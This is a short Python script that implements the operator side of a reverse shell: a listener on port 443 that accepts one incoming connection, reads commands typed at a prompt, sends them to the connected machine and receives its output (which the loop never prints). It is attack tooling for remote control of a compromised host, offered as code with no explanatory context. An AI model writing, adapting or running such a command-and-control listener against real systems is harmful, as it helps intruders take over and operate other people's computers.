#!/usr/bin/env python3

import socket

class Listener():
	def __init__(self, ip, port):
		server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		server_socket.bind((ip, port))
		server_socket.listen()

		self.client_socket, client_address = server_socket.accept()

	def execute(self, command):
		self.client_socket.send(command.encode())
		return self.client_socket.recv(2048).decode()

	def run(self):
		while True:
			command = input(">> ")
			command_output = self.execute(command)

if __name__ == "__main__":
	listener = Listener("<ip>", 443)
	listener.run()